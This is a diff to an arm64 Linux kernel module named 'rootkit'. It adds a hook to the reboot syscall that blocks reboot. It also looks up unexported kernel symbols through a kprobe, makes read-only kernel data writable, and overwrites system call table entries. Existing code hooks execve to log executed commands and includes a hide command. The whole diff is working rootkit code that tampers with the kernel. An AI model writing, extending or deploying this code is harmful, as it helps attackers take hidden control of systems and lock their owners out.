@@ -26,9 +26,10 @@ struct list_head *module_list;
 
 int (*access_remote_vm_)(struct mm_struct *, unsigned long,
 		void *, int, unsigned int);
-long (*__arm64_sys_execve_)(const struct pt_regs *);
 void (*update_mapping_prot_)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
 syscall_fn_t *sys_call_table_;
+long (*__arm64_sys_execve_)(const struct pt_regs *);
+long (*__arm64_sys_reboot_)(const struct pt_regs *);
 unsigned long __start_rodata_, __end_rodata_;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
@@ -49,6 +50,10 @@ long hook_execve (const struct pt_regs* regs) {
         printk (KERN_INFO "copy_from_user fail.\n");
 	printk (KERN_INFO "exec %s\n", path);
     return __arm64_sys_execve_(regs);
+}
+
+long hook_reboot (const struct pt_regs* regs) {
+    return EFAULT;
 }
 
 // Check get_mm_cmdline
@@ -112,6 +117,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         case IOCTL_MOD_HOOK:
             update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
             sys_call_table_[__NR_execve] = hook_execve;
+            sys_call_table_[__NR_reboot] = hook_reboot;
             //do something
             break;
         case IOCTL_MOD_HIDE:
@@ -175,16 +181,17 @@ static void ksym_lookup(void) {
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
     unregister_kprobe(&kp);
 
-    access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
-    __arm64_sys_execve_ = (void *)kallsyms_lookup_name("__arm64_sys_execve");
-    sys_call_table_ = (void *)kallsyms_lookup_name("sys_call_table");
+    access_remote_vm_    = (void *)kallsyms_lookup_name("access_remote_vm");
     update_mapping_prot_ = (void *)kallsyms_lookup_name("update_mapping_prot");
+    sys_call_table_      = (void *)kallsyms_lookup_name("sys_call_table");
+    __arm64_sys_execve_ = (void *)kallsyms_lookup_name("__arm64_sys_execve");
+    __arm64_sys_reboot_ = (void *)kallsyms_lookup_name("__arm64_sys_reboot");
     __start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
-    __end_rodata_ = (void *)kallsyms_lookup_name("__end_rodata");
+    __end_rodata_   = (void *)kallsyms_lookup_name("__end_rodata");
     
-    printk (KERN_INFO "%px\n", __arm64_sys_execve_);
     printk (KERN_INFO "%px\n", sys_call_table_);
-    printk (KERN_INFO "%px\n", sys_call_table_[__NR_execve]);
+    printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
+    printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
     printk (KERN_INFO "%px %px\n", __start_rodata_, __end_rodata_);
 }
 
@@ -221,6 +228,7 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
     sys_call_table_[__NR_execve] = __arm64_sys_execve_;
+    sys_call_table_[__NR_reboot] = __arm64_sys_reboot_;
 	// TODO: restore .rodata protect?
 
 	pr_info("%s: removed\n", OURMODNAME);
